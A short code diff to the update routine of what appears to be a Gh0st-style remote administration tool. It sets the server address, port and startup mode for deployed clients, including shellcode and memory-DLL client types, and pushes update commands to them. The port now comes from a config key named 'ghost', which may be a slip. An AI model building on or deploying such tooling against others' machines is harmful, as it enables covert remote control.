@@ -1822,7 +1822,7 @@ void CMy2015RemoteDlg::OnOnlineUpdate()
         dst->SetAdminId(GetMasterHash().c_str());
         memcpy(dst->szFlag, GetMasterId().c_str(), 16);
         strcpy_s(dst->szServerIP, THIS_CFG.GetStr("settings", "master", "127.0.0.1").c_str());
-        strcpy_s(dst->szPort, THIS_CFG.GetStr("settings", "port", "6543").c_str());
+        strcpy_s(dst->szPort, THIS_CFG.GetStr("settings", "ghost", "6543").c_str());
         dst->Encrypt();
         dst->iType = dlg.m_nSelected ? CLIENT_TYPE_ONE : CLIENT_TYPE_MEMDLL;
         dst->iStartup = dlg.m_nSelected ? Startup_GhostMsc : Startup_TestRunMsc;
@@ -1845,6 +1845,11 @@ void CMy2015RemoteDlg::OnOnlineUpdate()
         buffer[0] = COMMAND_UPDATE;
         memcpy(buffer + 1, &fileSize, 8);
         memcpy(buffer + 9, buf->c_str() + 6, fileSize);
+    }
+    else if (clientType == "SC" || clientType == "MDLL") {
+        fileSize = 0;
+        buffer = new BYTE[fileSize + 9]();
+        buffer[0] = COMMAND_UPDATE;
     }
 
     if (buffer) {
